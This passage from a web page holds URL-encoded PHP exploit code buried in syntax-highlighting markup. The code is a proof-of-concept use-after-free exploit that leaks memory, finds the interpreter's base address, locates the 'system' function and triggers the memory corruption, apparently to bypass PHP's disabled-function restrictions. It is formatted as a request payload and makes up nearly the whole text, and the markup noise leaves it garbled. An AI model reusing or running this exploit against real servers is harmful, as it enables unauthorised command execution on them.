class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">746e6174736</span>e<span class="hljs-number">6</span>f<span class="hljs-number">63</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>else<span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%204</span>)<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%200</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>leak)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">786568326e6962</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>else<span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>get_binary_base(<span class="hljs-variable">%24</span>binary_leak)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>start<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>binary_leak<span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%200</span>xfffffffffffff<span class="hljs-number">000</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">1000</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>start<span class="hljs-variable">%20</span>-<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">1000</span><span class="hljs-variable">%20</span>*<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%207</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10102464</span><span class="hljs-keyword">c</span><span class="hljs-number">457</span>f)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>get_system(<span class="hljs-variable">%24</span>basic_funcs)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>basic_funcs<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>do<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f_entry<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>f_name<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>f_entry<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%206</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>f_name<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">6</span>d<span class="hljs-number">6574737973</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>while(<span class="hljs-variable">%24</span>f_entry<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>trigger_uaf(<span class="hljs-variable">%24</span>arg)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>arg<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str_shuffle(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>vuln<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>vuln()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>vuln-<span class="hljs-variable">%3</span>ea<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>arg<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(stristr(php_os<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>&#x27;win&#x27;))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(&#x27;this<span class="hljs-variable">%20</span>poc<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>for<span class="hljs-variable">%20</span>*nix<span class="hljs-variable">%20</span>systems<span class="hljs-variable">%20</span>only.&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n_alloc<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%2010</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>contiguous<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n_alloc<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>contiguous<span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str_shuffle(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>trigger_uaf(&#x27;<span class="hljs-keyword">x</span>&#x27;)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%5</span>b<span class="hljs-number">1</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%5</span>b&#x27;args&#x27;<span class="hljs-variable">%5</span>d<span class="hljs-variable">%5</span>b<span class="hljs-number">0</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>helper<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper-<span class="hljs-variable">%3</span>eb<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span><span class="hljs-keyword">x</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(strlen(<span class="hljs-variable">%24</span>abc)<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%2079</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>strlen(<span class="hljs-variable">%24</span>abc)<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>die(<span class="hljs-variable">%22</span>uaf<span class="hljs-variable">%20</span>failed<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>closure_handlers<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>str<span 